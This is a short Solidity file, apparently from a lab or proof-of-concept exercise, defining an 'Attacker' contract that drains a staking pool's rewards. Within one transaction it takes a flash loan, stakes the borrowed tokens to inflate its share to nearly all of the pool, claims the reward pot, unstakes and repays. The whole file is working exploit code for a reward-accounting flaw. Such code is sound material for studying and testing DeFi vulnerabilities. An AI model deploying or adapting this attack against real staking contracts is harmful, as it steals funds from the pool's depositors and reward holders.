// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "./IERC20.sol";
import {IStakingPool} from "./IStakingPool.sol";
import {FlashLender} from "./FlashLender.sol";

/// @notice The whole exploit in ONE atomic transaction, driven by a flash loan.
contract Attacker {
    IERC20 public immutable stakeToken;
    IERC20 public immutable rewardToken;
    IStakingPool public immutable pool;
    FlashLender public immutable lender;

    constructor(IERC20 _stake, IERC20 _reward, IStakingPool _pool, FlashLender _lender) {
        stakeToken = _stake; rewardToken = _reward; pool = _pool; lender = _lender;
        stakeToken.approve(address(_pool), type(uint256).max);
    }

    function attack(uint256 loan) external { lender.flashLoan(loan); }

    function onFlashLoan(uint256 amount) external {
        require(msg.sender == address(lender), "only lender");
        pool.stake(amount);                          // 1. balloon our share to ~100%
        pool.claim();                                // 2. scoop the reward pot
        pool.unstake(amount);                        // 3. pull our stake back
        stakeToken.transfer(address(lender), amount);// 4. repay the flash loan -- same tx
    }
}
